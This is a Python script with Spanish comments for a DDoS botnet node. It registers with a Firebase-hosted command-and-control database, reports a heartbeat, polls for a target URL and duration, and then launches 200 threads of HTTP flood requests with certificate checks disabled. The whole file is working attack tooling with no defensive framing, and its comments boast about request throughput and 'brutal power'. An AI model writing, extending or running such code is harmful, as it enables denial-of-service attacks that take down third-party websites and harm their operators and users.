import requests
import time
import threading
import random
import urllib3

# Desactivar advertencias de SSL para ganar velocidad
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODE_ID = f"Node-{random.randint(1000, 9999)}"

def report_status():
    """Registra la máquina en Firebase para que el C2 la vea"""
    status_url = f"https://ryxen-c2-default-rtdb.firebaseio.com/nodes/{NODE_ID}.json"
    while True:
        try:
            requests.put(status_url, json={"last_seen": time.time(), "id": NODE_ID}, timeout=5)
        except: pass
        time.sleep(10)

def attack_engine(target, end_time):
    """Motor de ataque con persistencia de conexión"""
    # Usar Session es la clave para no bajar de 7k requests
    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
    }
    
    while time.time() < end_time:
        try:
            # TLS Handshake + HTTP Flood
            session.get(target, headers=headers, timeout=3, verify=False)
        except:
            # Si hay error, reiniciamos la sesión para limpiar el socket
            session = requests.Session()
            pass

def monitor():
    last_stamp = ""
    print(f"[SYSTEM] {NODE_ID} Online and Ready.")
    
    # Iniciar reporte de estado en segundo plano
    threading.Thread(target=report_status, daemon=True).start()

    while True:
        try:
            r = requests.get(DB_URL, timeout=5).json()
            if r and r.get('stamp') != last_stamp:
                last_stamp = r['stamp']
                target = r['target'] if r['target'].startswith("http") else f"http://{target}"
                duration = int(r['time'])
                end_time = time.time() + duration
                
                print(f"[!] Lanzando fuego a {target} por {duration}s")
                
                # 200 hilos con Sesiones persistentes = Potencia brutal
                for _ in range(200):
                    threading.Thread(target=attack_engine, args=(target, end_time), daemon=True).start()
        except:
            pass
        time.sleep(2)

if __name__ == "__main__":
    monitor()
    
